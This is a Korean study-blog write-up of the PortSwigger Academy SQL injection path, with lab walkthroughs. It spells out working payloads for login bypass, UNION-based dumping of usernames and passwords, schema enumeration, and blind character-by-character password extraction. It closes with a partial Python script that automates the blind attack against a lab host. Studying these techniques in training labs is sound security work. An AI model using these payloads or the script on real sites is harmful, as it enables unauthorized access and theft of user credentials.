---
title: '[PortSwigger] Academy: SQL Injection'
date: 2024-04-01 00:00:00
categories: [Study, PortSwigger]
tags: [webhacking, portswigger]
published: True
---

> [[PortSwigger Academy SQL Injection](https://portswigger.net/web-security/learning-paths/sql-injection)] 을 수강하고 정리하였습니다.
{: .prompt-info }

<br><br>

# #What is SQL injection?

---

SQL injection(SQLi)는 공격자가 어플리케이션이 데이터베이스에 수행하는 쿼리를 방해할 수 있게 하는 웹 보안 취약점이다. 이는 공격자가 정상적으로 조회할 수 없는 데이터를 조회하도록 해준다. 이 데이터는 다른 사용자나 어플리케이션에 접근할 수 있는 다른 데이터를 포함할 수도 있다. 많은 경우에 공격자는 데이터를 수정하고 지움으로써 어플리케이션의 내용이나 동작의 영구적인 변화를 초래할 수 있다.

<br>

몇몇의 경우에서는 공격자는 SQL 인젝션을 확대하여 기본 서버나 기타 백엔드 인프라를 손상시킬 수도 있다. 이는 denial-of-service 공격을 수행할 수 있게 만들기도 한다.

<br><br>

# How to detect SQL injection vulnerabilities

---

- 싱글 쿼터 `'`를 입력하고 에러나 다른 변화가 있는지를 살펴본다.
- 원래 진입전과 다른 값을 평가하고 어플리케이션 응답에서 차이점을 찾는 일부 SQL 구문을 주입한다.
- `OR 1=1`이나 `OR 1=2`와 같은 조건문을 입력하고 어플리케이션 응답의 차이점을 확인한다.
- SQL 쿼리에서 시간 지연을 발생시키는 페이로드를 제출하고 시간에 따른 응답 차리를 확인한다.
- SQL 쿼리 내에서 실행될 때 네트워크 상호 작용을 발생하는 OAST 페이로드를 제출하고 상호작용을 모니터링한다.

또는 *Burp Scanner*를 사용해서 대부분의 SQL 인젝션 취약점을 빠르고 안정적으로 찾을 수 있다.

<br>

## SQL injection in different parts of the query

대부분의 SQL 인젝션 취약점은 `SELECT` 쿼리의 `WHERE` 절 내에서 발생한다. 많은 숙련된 테스터는 SQL 인젝션의 종류에 친숙하다. 그러나, SQL 인젝션 취약점은 쿼리 내의 어디에서든지 발생할 수 있고, 다른 타입의 쿼리에서도 발생할 수 있다.

<br>

다음은 SQL 인젝션이 발생하는 흔한 위치이다.

- `UPDATE`문에서, 값을 업데이트하거나 `WHERE` 절 내에서
- `INSERT`문에서, 삽입된 값 내에서
- `SELECT`문에서, 테이블이나 컬럼 이름에서
- `SELECT`문에서, `ORDER BY`절 내에서

<br><br>

# #Retrieving hidden data

`https://insecure-website.com/products?category=Gifts`

카테고리에 따라 상품을 보여주는 쇼핑 어플리케이션이 있다고 가정하자. 사용자가 **Gift** 카테고리를 클릭할 때 브라우저는 위와 같은 URL을 요청할 것이다.

<br>

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

이는 어플리케이션이 데이터베이스에서 관련된 상품의 정보를 조회하는 SQL query를 만들도록 할 것이다.

<br>

`released=1` 제한은 공개되지 않은 상품을 숨기기 위해 사용된다. 그렇다면 공개되지 않은 상품은 `released=0`이라고 가정할 수 있다.

<br>

`https://insecure-website.com/products?category=Gifts'--`

어플리케이션이 어떠한 SQL 주입 공격에 대한 보호 기법을 적용하지 않는다면 공격자가 위와 같은 공격을 수행할 수 있음을 의미한다.

<br>

`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

공격에 따라 만들어지는 SQL 쿼리는 위와 같다. `--`는 SQL에서 주석을 의미한다. 이는 잇따르는 구문은 주석으로 해석되고 이를 삭제하는 효과를 의미한다. 이 예시에서 `AND released = 1`는 더 이상 쿼리에 포함되지 않는다. 결과적으로 공개되지 않은 상품을 포함하여 모든 상품이 공개될 것이다.

<br>

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

어플리케이션이 카테고리에 있는 모든 상품을 표시하도록 하는 위와 같은 비슷한 공격을 할 수도 있다.

<br>

## 🚩Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

`GET /filter?category=Gifts HTTP/2`

카테고리를 선택할 때 위의 요청을 보내는 것을 확인할 수 있다. 이때 `category` 파라미터 값으로 해당하는 카테고리명을 전달한다.

<br>

`GET /filter?category=Gifts'+or+1=1+-- HTTP/2`

현재 보여지는 상품들은 `released=1` 조건이 포함된 상품들이므로 공개되지 않은 상품을 포함해서 보기 위해서는 위와 같이 SQL문을 구성해야한다. `--` 문으로 인해 잇따르는 `released` 제한을 무력화시킬 수 있기에 모든 상품들이 조회되는 것이다.

<br>

# #Subverting application logic

---

`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

이번에는 사용자명과 패스워드를 로그인에 사용하는 어플리케이션을 가정해보자. 만약 사용자가 사용자명으로 `wiener`을 패스워드로 `bluecheese`를 입력했다면 어플리케이션은 위와 같은 SQL 쿼리를 수행하여 자격을 체크할 것이다.

<br>

만약 쿼리가 사용자의 세부사항을 반환한다면 그 로그인은 성공한 것이다. 이런 경우에서 공격자는 패스워드 없이 어떠한 유저로도 로그인 할 수 있다. SQL 주석을 의미하는 `--`를 사용하여 `WHERE`절에서 패스워드 체크 과정을 삭제할 수 있다.

<br>

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

예를 들어, 사용자명으로 `administrator'--`와 패스워드에 공백 문자를 넣고 제출하면 위와 같은 쿼리를 구성할 것이다. 이 쿼리는 `username`이 `administrator`인 사용자를 반환하고 성공적으로 공격자가 해당 사용자로 로그인 하도록 한다.

<br>

## 🚩Lab: SQL injection vulnerability allowing login bypass

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/d805842f-9584-47f0-b147-ec98eb59e70b)

로그인 페이지에서 `username` 값으로 `administrator'--`을, `password` 값으로 임의의 문자를 넣어 로그인하면 패스워드를 체크하는 구문이 주석 처리되어 패스워드 없이 `administrator` 계정으로 로그인 할 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/496362b9-a2d5-4bc1-8e5e-c2393a43f619)


<br><br>

# #SQL injection UNION attacks

---

애플리케이션이 SQL 인젝션에 취약하고 쿼리의 결과가 애플리케이션의 응답 내에 반환된다면, 데이터베이스에 있는 다른 테이블로부터 데이터를 조회하기 위해 `UNION` 키워드를 사용할 수 있다. 이는 흔히 SQL injection UNION 공격으로 알려져 있다.

<br>

`UNION` 키워드는 추가적인 `SELECT` 쿼리를 실행할 수 있도록 해주고 원래의 쿼리에 결과를 추가시킬 수 있다.

<br>

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

위와 같은 예시에서, SQL 쿼리는 2개의 컬럼에 단일 집합 결과를 반환하는데 이는 `table1`에 있는 `a`와 `b` 컬럼과 `table2`에 있는 `c`와 `d` 컬럼을 포함한다.

<br>

- 개별의 쿼리는 같은 수의 컬럼을 반환해야 한다.
- 각 컬럼에 있는 데이터 타입은 개별의 쿼리 간에 호환되어야 한다.

`UNION` 쿼리를 사용하기 위해서는 위의 핵심 요구사항이 충족되어야 한다.

<br>

- 원래 쿼리로부터 몇 개의 컬럼이 반환되었는가
- 원래 쿼리로부터 번환된 컬럼은 삽입된 쿼리의 결과를 저장하기에 적합한 데이터 타입인가

SQL injection UNION 공격을 수행하기 위해서는 공격자는 위의 두 요구사항이 충족되었는지 확인해야한다.

<br><br>

# #Determining the number of columns required

---

SQL injection UNION 공격을 수행할 때, 원래 쿼리로부터 몇 개의 컬럼이 반환되었는지를 결정하는 두 효과적인 방법이 있다.

<br>

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```

첫 번째는 연속된 `ORDER BY` 절을 삽입하고 에러가 발생할 때까지 특정한 컬럼 인덱스를 증가시키는 것이다. 예를 들어, 삽입 지점이 원래 `WHERE` 절 내에 싱글 쿼터(`'`) 내에 있다면 위의 쿼리를 삽입하는 것이다.

<br>

이 연속된 페이로드는 본래의 쿼리를 결과 집합 내에서 다른 컬럼 별로 결과가 정렬될 수 있도록 수정한다. `ORDER BY`절 내에 있는 열은 해당 인덱스에 의해 특정될 수 있어서 어떤 컬럼이든 이름을 알 필요가 없다. 특정된 컬럼 인덱스는 결과 집합의 실제 컬럼의 수를 초과시킬 때, 데이터베이스는 `The ORDER BY position number 3 is out of range of the number of items in the select list.`과 같은 에러를 반환한다.

<br>

애플리케이션은 해당 HTP 응답 내에 데이터베이스 에러를 반환할 수도 있는데, 이는 일반적인 에러 응답을 발생시킬 수도 있다. 다른 경우에는, 단순하게 아무런 결과도 반환하지 않을 수도 있다. 두 경우 모두 응답에서 약간의 차이를 감지할 수 있는 한 쿼리에서 반환되는 컬럼 수를 유추할 수 있다.

<br>

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
```

두 번째 방법은 여러 다른 null 값을 특정하는 연속된 `UNION SELECT` 페이로드를 제출하는 것이다. 만약 null의 수가 컬럼의 수와 맞지 않는다면 데이터베이스는 `All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`과 같은 에러를 반환한다.

<br>

각 컬럼에 있는 데이터 타입이 원래의 쿼리와 삽입된 쿼리 간에 호환이 되어야 하기 때문에 `NULL`을 삽입된 `SELECT` 쿼리로부터 반환받은 값으로 사용한다.`NULL`은 모든 흔한 데이터 타입으로 바뀔 수 있어서 컬럼 수가 맞을 때 페이로드를 성공시킬 확률을 최대화 할 수 있다.

<br>

`ORDER BY` 방법과 마찬가지로 애플리케이션이 실제로 HTTP 응답 내에 있는 데이터베이스 에러를 반환하는데, 일반적인 에러를 반환하거나 단순히 아무런 결과도 반환하지 않을 수도 있다. null의 수가 컬럼의 수와 맞을 때, 데이터베이스는 결과 집합 내에 각 컬럼에 있는 null 값을 포함하는 추가적인 컬럼을 반환한다. HTTP 응답에 미치는 영향은 애플리케이션의 코드에 달려있다. 만약 운이 좋다면, HTML 테이블에 추가적인 행과 같이 응답 내에 추가적인 내용을 볼 수 있을 것이다. 그렇지 않다면, null 값은 `NullPointerException`과 같은 다른 에러를 일으킬지도 모른다. 최악의 경우에는 응답이 null의 수와 같지 않을 때 발생하는 응답과 똑같을 수도 있다. 이는 이 방법을 비효과적으로 만들 것이다.

<br>

## 🚩Lab: SQL injection UNION attack, determining the number of columns returned by the query

`/filter?category=Gifts`

이 문제는 카테고리 선택 시에 사용되는 데이터베이스 내의 테이블의 컬럼 수를 알아내는 문제이다. 우선 상품의 카테고리를 선택할 때 요청하는 경로는 위와 같음을 알 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/89f75778-0744-403f-8409-f5a2f2e323b1)

`/filter?category='+UNION+SELECT+NULL+--`

`category` 매개변수 값으로 전달되는 값이 SQL 쿼리 문의 싱글 쿼터 내에 들어간다고 가정했을 때, 위와 같은 페이로드로 요청함으로써 SQL injection UNION 공격을 시도해볼 수 있다. 해당 요청에 대한 결과는 위와 같이 에러 메시지를 표시하고, 이로써 데이터베이스 테이블의 컬럼 수가 1개가 아니라는 사실을 알 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/8f7fd7ac-74bb-4038-88ff-db5b79bc9985)

`/filter?category='+UNION+SELECT+NULL,NULL,NULL+--`

`NULL` 값의 수를 늘려가며 시도하면 3개일 때 위와 같이 에러 메시지 대신 카테고리 조회한 것과 같은 효과로 페이지를 확인할 수 있는데, 이를 통해 테이블의 컬럼 수가 3개임을 알 수 있다.

<br>

## Database-specific syntax

`' UNION SELECT NULL FROM DUAL--`

*Oracle*에서는 모든 `SELECT` 쿼리가 `FROM` 키워드를 사용해야 하고, 유효한 테이블을 특정해야 한다. Oracle에는 SQL injection UNION 공격을 위해 사용할 수 있는 `dual`이라고 부르는 내장 테이블이 있다. 그래서 Oracle에 삽입된 쿼리는 위와 같은 모습이어야 한다.

<br>

설명된 이 페이로드는 주석 시퀀스 `--`를 사용하여 삽입 지점 다음에 오는 원래 쿼리의 나머지 부분을 주석 처리한다. *MySQL*에서는 주석 시퀀스 뒤에 공백이 나와야한다. 대안으로 해시 문자 `#`를 사용할 수도 있다.

<br>

특정 데이터베이스 구문에 대한 정보는 [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)를 참고하면 된다.

<br><br>

# #Finding columns with a useful data type

---

SQL injection UNION 공격은 삽입된 쿼리로부터 얻는 결과를 조회할 수 있게 해준다. 우리가 얻기를 원하는 관심있는 데이터는 보통 문자열 형태이다. 이는 데이터 유형이 문자열 타입이거나 호환되는 원래 쿼리 결과에서 하나 이상의 컬럼을 찾아야함을 의미한다.

<br>

필요한 컬럼 수를 알아내고 난 후에는 각 컬럼을 조사하여 이 것이 문자열 데이터를 갖고 있는지 테스트할 수 있다. 이를 위해 각 컬럼에 차례로 문자열 값을 배치하는 연속된 `UNION SELECT` 페이로드를 제출할 수 있다.

<br>

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

예를 들어, 만약 쿼리가 4개의 컬럼을 반환한다면 위와 같이 페이로드를 구성할 수 있다.

<br>

`Conversion failed when converting the varchar value 'a' to data type int.`

만약 컬럼 데이터 타입이 문자열 데이터와 호환되지 않는다면, 삽입된 쿼리는 위와 같은 데이터베이스 에러를 발생시킬 수 있다.

<br>

에러가 발생하지 않고 애플리케이션의 응답이 삽입된 문자열 값을 포함한 추가적인 내용을 포함한다면, 해당 열은 문자열 데이터를 조회하는 데에 적합하다는 것을 의미한다.

<br>

## 🚩Lab: SQL injection UNION attack, finding a column containing text

우선 카테고리 선택 시 요청하는 패킷에서 포함되는 `category` 매개변수 값에서 SQL 인젝션이 가능함을 알 수 있다. 이때 사용하는 데이터베이스 테이블의 컬럼에 문자열이 포함되어 있는지를 확인해야 한다. 이를 위해서는 먼저 테이블의 컬럼의 수가 몇인지를 조사해야 한다.

<br>

```
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL+-- HTTP/2
```

SQL injection UNION 공격을 이용하여 null 값을 늘려가며 테이블의 컬럼 수가 몇인지를 조사할 수 있다. 위의 요청처럼 null 값이 3개일 때 반환되는 페이지에서 에러 메시지가 출력되지 않는 것을 확인할 수 있고, 따라서 테이블의 컬럼이 3개임을 알 수 있다.

<br>

```
'+UNION+SELECT+bdQCPq,NULL,NULL+--
'+UNION+SELECT+NULL,'bdQCPq',NULL+--
'+UNION+SELECT+NULL,NULL,'bdQCPq'+--
```

이제 주어진 문자열 `bdQCPq`을 이용하여 테이블에 문자열이 포함되어 있는지를 확인해보자. null 값의 위치에 해당 문자열을 넣어서 페이로드를 구성하면 위와 같은 3가지 경우가 있을 것이다. 위의 경우를 모두 시도해본 결과 문자열이 두 번째 컬럼에 존재함을 알 수 있고, 문제를 해결할 수 있다.

<br><br>

# #Using a SQL injection UNION attack to retrieve interesting data

원래 쿼리로부터 반환받은 컬럼의 수를 알아내었고 어떤 컬럼이 문자열 데이터를 가지고 있는지를 찾아내었으면, 이제 관심 있는 데이터를 얻을 수 있다.

<br>

- 원래 쿼리가 두 개의 컬럼을 반환하고, 두 컬럼 모두 문자열 데이터를 갖고 있다.
- injection 포인트가 `WHERE`절 쿼터 스트링 내에 포함되어 있다.
- 데이터베이스가 `username`과 `password` 컬럼을 갖고 있는 `users` 테이블을 포함하고 있다.

위와 같은 상황이라고 가정해보자.

<br>

`' UNION SELECT username, password FROM users--`

이 예시에서 위의 input을 제출함으로써 `users` 테이블의 내용을 조회할 수 있다. 이 공격을 수행하기 위해서는 두 개의 컬럼 `username`과 `password`를 가진 `users` 테이블이 있다는 사실을 알고 있어야 한다. 이 정보가 없다면 테이블과 컬럼의 이름을 추측해야할 것이다. 모든 최신 데이터베이스들은 데이터베이스 구조를 검사하고 데이터베이스에 포함된 테이블과 열을 확인하는 방법을 제공한다.

<br>

## 🚩Lab: SQL injection UNION attack, retrieving data from other tables

문제에서 제공하는 정보에 따라 이 서비스에서 사용하는 데이터베이스에는 `username`과 `password` 컬럼을 가진 `users` 테이블이 존재한다. `administrator` 계정 정보를 얻기 위해서는 SQL injection 취약점이 존재하는 상품 카테고리 필터 기능에서 UNION절을 이용하여 `users` 테이블의 내용을 조회해야할 것이다.

<br>

```
/filter?category='+UNION+SELECT+username,password+FROM+users--+
```

앞에서 언급한대로 페이로드를 작성하여 위의 경로로 요청을 보내보자.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/bfd3401c-cc6d-431f-9ca8-8ada9ec79f68)

그러면 사진과 같이 테이블에 있는 모든 내용을 확인할 수 있다. 이제 획득한 `administrator` 계정으로 로그인하면 문제를 해결할 수 있다.

<br><br>

# #Retrieving multiple values within a single column

어떤 경우에서는 이전 예시의 쿼리가 단일 컬럼만을 반환할 수도 있다. 이때는 값을 함께 연결하면 이 단일 컬럼 내에서 여러 값을 함께 검색할 수 있다. 연결한 값을 구분할 수 있도록 구분자를 포함할 수 있다.

<br>

`' UNION SELECT username || '~' || password FROM users--`

예를 들어 Oracle에서 위와 같은 입력 값을 제출할 수 있다. Oracle에서 문자열을 연결할 수 있는 연산자인 이중 파이프 시퀀스 `||`를 사용한다. 삽입된 쿼리는 `~` 문자로 분리된 `username`과 `password` 필드의 값을 연결한다.

<br>

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

이 쿼리에 대한 결과는 위와 같이 모든 사용자명과 패스워드를 포함한다. 더 많은 문자열 연결 연산자는

<br>

## 🚩Lab: SQL injection UNION attack, retrieving multiple values in a single column

이전에 진행했던 랩과 마찬가지로 순서대로 SQL injection을 진행하면서 `administrator` 계정 정보를 찾아내자.

<br>

1. NULL 값의 수를 늘려가며 해당 테이블의 컬럼 개수를 조사한다. 아래 경로로 요청을 하면 서버 에러가 나타나지 않기에 컬럼의 수는 2개임을 알 수 있다.

    `/filter?category='+UNION+SELECT+NULL,NULL+--`

    <br>

2. 문자열 데이터를 갖고 있는 컬럼을 조사한다. 이를 위해서는 아래와 같이 2개의 경로로 요청해볼 수 있는데, 두 번째 경로에서 에러가 나타나지 않는 것으로 보아 두 번째 컬럼만 문자열 데이터를 갖고 있음을 알 수 있다.

    ```
    /filter?category='+UNION+SELECT+'a',NULL+--
    /filter?category='+UNION+SELECT+NULL,'a'+--
    ```

    <br>

3. 문제에서 `users` 테이블에서 `username`과 `password` 컬럼이 존재한다는 사실을 주어졌고 두 컬럼 정보를 두 번째 컬럼 하나에서 조회할 수 있도록 쿼리를 구성해야한다. 문자열 연결 연산자 `||`를 이용하고 두 문자열을 구분하기 위해 구분자를 `/`로 하여 다음과 같이 페이로드를 구성할 수 있다.

    `'+UNION+SELECT+NULL,username+||+'/'+||+password+FROM+users+--`

    <br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/f47971ca-7894-427d-ba99-59d4462bf7b4)

이제 모든 계정 정보를 위와 같이 확인할 수 있고, `administrator` 계정으로 로그인하면 문제를 해결할 수 있다.

<br><br>

# #Examining the database in SQL injection attacks

- 데이터베이스 소프트웨어의 타입과 버전
- 데이터베이스가 포함하고 있는 테이블과 컬럼

SQL injection 취약점을 익스플로잇하기 위해서는 위의 정보를 포함한 데이터베이스에 대한 정보를 찾는 것이 필수적이다.

<br>

## Querying the database type and version

제공되는 특정 쿼리를 삽입함으로써 데이터베이스의 타입과 버전을 알아낼 수 있다.

<br>

|Database type|Query|
|--|--|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

위의 표는 주요 데이터베이스 타입에 따른 데이터베이스 버전을 조사하는 쿼리이다.

<br>

`' UNION SELECT @@version--`

위와 같이 `UNION` 공격을 이용할 수 있다.

<br>

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

위는 앞선 입력에 대한 반환되는 결과이다. 이 경우에는 데이터베이스가 Microsoft SQL Server이고 사용된 버전을 확인할 수 있다.

<br>

## 🚩Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

앞선 랩과 같이 가장 먼저 테이블의 컬럼 수를 조사해야 한다. UNION 공격을 통해 컬럼이 2개 존재함을 알 수 있다.

<br>

두 번째로 컬럼 중 문자열 데이터를 포함한 컬럼을 조사해야 한다. 마찬가지로 UNION 공격을 통해 두 컬럼 모두 문자열 데이터를 포함하고 있다는 사실을 알 수 있다.

<br>

`/filter?category='+UNION+SELECT+@@version,NULL+--+`

이제 데이터베이스의 버전을 조사할 수 있는 `@@version`을 포함하여 위와 같이 페이로드를 작성하고 경로로 요청을 해보자.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/f3cc1659-20d9-4eac-abae-760b207fd1ac)

위와 같이 데이터베이스의 버전을 획득할 수 있고 문제를 해결할 수 있다.

<br>

## Listing the contents of the database

Oracle을 제외한 대부분의 데이터베이스 타입은 information schema라고 불리는 집합이 있다. 이는 데이터베이스에 대한 정보를 제공한다.

<br>

`SELECT * FROM information_schema.tables`

예를 들어, `information_schema.tables`를 쿼리하여 데이터베이스 내에 테이블을 나열할 수 있다.

<br>

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

이는 위와 같은 결과를 반환하는데, `Products`, `Users`, `Feedback`이라는 세 개의 테이블이 존재한다는 것을 알려준다.

<br>

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

`information_schema.columns`을 쿼리하여 개별 테이블 내의 컬럼을 나열할 수 있다.

<br>

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

이는 위와 같은 결과를 반환하는데, 특정한 테이블에 있는 컬럼과 각 컬럼의 데이터 타입을 보여준다.

<br>

## 🚩Lab: SQL injection attack, listing the database contents on non-Oracle databases

앞선 랩과 같이 테이블의 컬럼 수를 조사하여 2개임을 알아내고, 컬럼 중에서 문자열 데이터를 갖고 있는 컬럼을 조사하여 두 컬럼 모두 문자열 데이터를 가지고 있는 사실을 알아낸다.

<br>

이제 `administrator` 계정에 대한 정보를 얻기 위해서는 계정 정보가 저장되어 있는 테이블의 이름을 알아내어 해당 테이블의 내용을 모두 확인하면 된다.

<br>

`/filter?category='+UNION+SELECT+version(),NULL+--`

우선 위의 경로로 요청을 보내어 사용된 데이터베이스의 타입이 PostgreSQL이라는 것을 알 수 있다.

<br>

`/filter?category='+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables+--`

먼저 계정 정보가 저장되어 있는 테이블의 이름을 알아내어 보자. 위의 경로로 요청을 보내면 데이터베이스에 포함된 모든 테이블 정보를 알 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/5de051e3-3d59-4b7d-977c-ada4e1539ed6)

그 중에서 사용자 정보를 담고 있을 것 같은 테이블을 찾기 위해 `user` 키워드를 갖고 있는 테이블을 찾아보면 위와 같이 `users_gsszwa` 테이블을 확인할 수 있다.


<br>

`/filter?category='+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+information_schema.columns+WHERE+TABLE_NAME='users_gsszwa'+--`

이제 위와 같이 페이로드를 작성하고 경로로 요청을 보내어 해당 테이블에 어떤 컬럼을 갖고 있고 그 컬럼의 데이터 타입이 무엇인지를 조사하자.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/e8c77b6e-cad2-45b9-8456-258d47c1f17f)

위와 같이 사용자의 이름과 비밀번호를 저장하는 것으로 보이는 컬럼 `username_qyzfav`과 `password_fjhdhf`을 찾아내었다.

<br>

`/filter?category='+UNION+SELECT+username_qyzfav,password_fjhdhf+FROM+users_gsszwa+--`

앞에서 찾아낸 컬럼명을 이용하여 해당 테이블에 있는 모든 사용자명과 패스워드를 조회해보자.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/79b9b6f1-c755-41ec-94b0-a1735e4d481f)

위와 같이 모든 사용자의 사용자명과 패스워드를 획득할 수 있고, `administrator` 계정으로 로그인하면 문제를 해결할 수 있다.

<br><br>

# #Blind SQL injection

애플리케이션이 SQL 인젝션에 취약하지만 HTTP 응답에 SQL 쿼리와 관련된 결과나 어떠한 데이터베이스 에러 정보도 포함되어 있지 않을 때 블라인드 SQL 인젝션이 발생한다. `UNION` 공격과 같이 많은 기술이 블라인드 SQL 인젝션 취약점에 효과적이지 않다. 이는 애플리케이션의 응답 내에 삽입된 쿼리의 결과를 볼 수 있는지에 달려 있기 때문이다. 블라인드 SQL 인젝션 역시 허가되지 않은 데이터에 접근할 수 있으나, 다른 기술이 사용되어야 한다.

<br>

## Exploiting blind SQL injection by triggering conditional responses

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

추적 쿠키를 사용하여 사용량에 대한 분석을 수집하는 애플리케이션을 생각해보자. 애플리케이션에 대한 요청은 위와 같은 쿠키 헤더를 포함한다.

<br>

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

`TrackingId` 쿠키를 포함하는 요청이 진행될 때, 애플리케이션은 이것이 알고 있는 사용자인지를 조사하기 위해 위와 같은 SQL 쿼리를 사용한다.

<br>

이 쿼리는 SQL 인젝션에 취약하나, 쿼리에 대한 결과는 사용자에게 반환되지 않는다. 그러나, 애플리케이션은 쿼리가 어떠한 데이터를 반환하는지에 따라 다르게 동작한다. 만약에 알고 있는 `TrackingId`를 제출한다면, 쿼리는 데이터를 반환하고 "Welcome back"과 같은 메시지를 응답으로 받을 것이다.

<br>

이 동작은 블라인드 SQL 인젝션 취약점을 익스플로잇 하기에 충분하다. 삽입된 조건에 따라 조건부로 다른 응답을 발생시켜 정보를 검색할 수 있다.

<br>

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

이 익스플로잇이 작동하는 방법을 이해하기 위해서는 위와 같이 두 개의 요청이 `TrackingId` 쿠키 값을 포함하여 차례로 전송된다고 가정해보자.

- 첫 번째 값은 쿼리가 결과를 반환하도록 만드는데, 이는 삽입된 `AND '1'='1` 조건이 참이기 때문이다. 결과적으로 "Welcome back" 메시지가 표시된다.
- 두 번째 값은 쿼리가 어떠한 결과도 반환하지 않도록 하는데, 이는 삽입된 조건이 거짓이기 때문이다. "Welcome back" 메시지는 표시되지 않는다.

<br>

이는 어떠한 삽입된 단일 조건에 대한 답을 결정할 수 있도록하고 한 번에 한 조각씩 데이터를 추출할 수 있다.

<br>

예를 들어, `Username`과 `Password` 컬럼을 가진 `Users` 테이블이 있고 `Administrator`라 불리는 사용자가 있다고 가정해보자. 한 번에 한 문자씩 패스워드를 테스트하기 위해서 일련의 입력을 전송함으로써 이 사용자에 대한 패스워드를 결정할 수 있다.

<br>

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

이를 위해서는 입력 값이 위와 같이 시작한다. 이는 "Welcome back" 메시지를 반환하고, 삽입된 조건이 참이고 따라서 패스워드의 첫 번째 문자가 `m`보다 크다는 것을 의미한다.

<br>

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

다음 입력은 "Welcome back" 메시지를 반환하지 않고, 삽입된 조건이 거짓이며 따라서 패스워드의 첫 번째 문자가 `t` 보다 작다는 것을 의미한다.

<br>

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

결국 위의 입력 값을 전송하면 "Welcome back" 메시지를 반환받고, 이로 인하여 패스워드의 첫 번째 문자가 `s`라는 것을 확인할 수 있다. 이 과정을 계속하여 `Administrator` 사용자에 대한 전체 패스워드를 시스템적으로 결정할 수 있다.

<br>

> `SUBSTRING` 함수는 몇 개의 데이터베이스 타입에서 `SUBSTR`로 불린다.
{: .prompt-info}

<br>

## 🚩Lab: Blind SQL injection with conditional responses

문제로부터 데이터베이스가 `username`과 `password` 컬럼을 가진 `users` 테이블을 포함한다는 것을 알 수 있다.

<br>

![image](https://github.com/1unaram/1unaram.github.io/assets/37824335/78e1a47c-cce6-46dc-b44c-f07bb3997cc0)

메인 페이지에 접속하면 "Welcome back!"이라는 문구를 볼 수 있고 사이트의 쿠키 값을 보면 `TrackingId` 이름으로 쿠키 값이 설정되어 있는 것을 확인할 수 있다.

<br>

`wW7o8TT4H4qCkL3i' AND length((SELECT password FROM users WHERE username = 'administrator')) < 30 --`

이제 패스워드 값을 알아내기 위해 `TrackingId` 값에 SQL 인젝션을 시도해보자. 우선, `SUBSTRING()` 함수를 바로 사용하여 패스워드를 첫 번째 자리부터 하나씩 알아갈 수도 있지만 길이를 우선 알고 있으면 더 편하게 구할 것이라고 생각하여 위와 같이 `LENGTH()` 함수를 사용하여 패스워드의 길이를 알아내었다. 알아낸 패스워드의 길이는 `20`이었다.

<br>

본격적으로 SUBSTRING 함수를 이용하여 20자의 패스워드를 알아내면 된다. 하지만 길이가 길기 때문에 범위를 계속 좁혀가며 요청을 보내어 패스워드 한 자씩을 알아내는 과정에 시간이 많이 필요할 것이다. 따라서 이를 자동화 할 수 있는 Python 코드를 작성해보았다.

<br>

```python
import requests

url='https://0a46006704e89589879a489c00f4006f.web-security-academy.net/'
password = ""

for i in range(20):
    low = 32
    high = 126

    while low+1 < high:
        mid = (low + high) // 2
        headers = {
            "session":"jffFsB8D5nZUH4r1wUjKQqiprYScqqvV",
            "Cookie": f"TrackingId=wW7o8TT4H4qCkL3i' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {i+1}, 1) < '{chr(mid)}"
        }
        response = requests.get(url, headers=headers)

        if "Welcome back!" in response.text:
            high = mid
